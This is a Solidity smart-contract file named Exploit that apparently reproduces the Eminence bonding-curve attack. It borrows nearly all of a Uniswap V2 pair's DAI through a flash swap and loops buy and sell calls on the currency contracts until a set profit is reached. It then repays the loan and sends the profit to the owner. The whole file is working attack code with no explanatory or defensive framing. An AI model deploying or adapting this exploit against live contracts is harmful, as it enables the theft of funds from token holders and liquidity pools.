// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IEminenceCurrency {
    function buy(uint _amount, uint _min) external returns (uint _bought);
    function sell(uint _amount, uint _min) external returns (uint _bought);
}

contract Exploit{
    IUniswapV2Pair private pair;
    address private owner;
    IERC20 private dai;
    address private currency;
    address private currencyBase;
    uint256 private profitDaiAmount;
    
    constructor(address _pair, address _dai, address _currency, address _currencyBase) {
        pair = IUniswapV2Pair(_pair);
        owner = msg.sender;
        dai = IERC20(_dai);
        currency = _currency;
        currencyBase = _currencyBase;
    }

    function start(uint256 _profitDaiAmount) external {
        profitDaiAmount = _profitDaiAmount;
        bool t0 = pair.token0() == address(dai);
        uint256 maxDai = dai.balanceOf(address(pair)) - 1e18;
        if (t0) {
            pair.swap(maxDai, 0, address(this), new bytes(0x1));
        } else {
            pair.swap(0, maxDai, address(this), new bytes(0x1));
        }
        dai.transfer(owner, dai.balanceOf(address(this)));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == address(pair), "invalid sender");
        uint256 daiAmount = dai.balanceOf(address(this));
        dai.approve(address(currencyBase), type(uint256).max);        
        while(true) {
            IEminenceCurrency(currencyBase).buy(daiAmount, 0);
            IERC20(currencyBase).approve(currency, type(uint256).max);
            //To get more dai, currencyBase's totalSupply need to decrease
            IEminenceCurrency(currency).buy(IERC20(currencyBase).balanceOf(address(this)) / 2, 0);           
            IEminenceCurrency(currencyBase).sell(IERC20(currencyBase).balanceOf(address(this)), 0);

            IEminenceCurrency(currency).sell(IERC20(currency).balanceOf(address(this)), 0);
            IEminenceCurrency(currencyBase).sell(IERC20(currencyBase).balanceOf(address(this)), 0);
            if (dai.balanceOf(address(this)) - daiAmount >= profitDaiAmount) {
                break;
            }
        }
        //repay flashloan
        dai.transfer(address(pair), daiAmount * 1000 / 997 + 1);
    }

}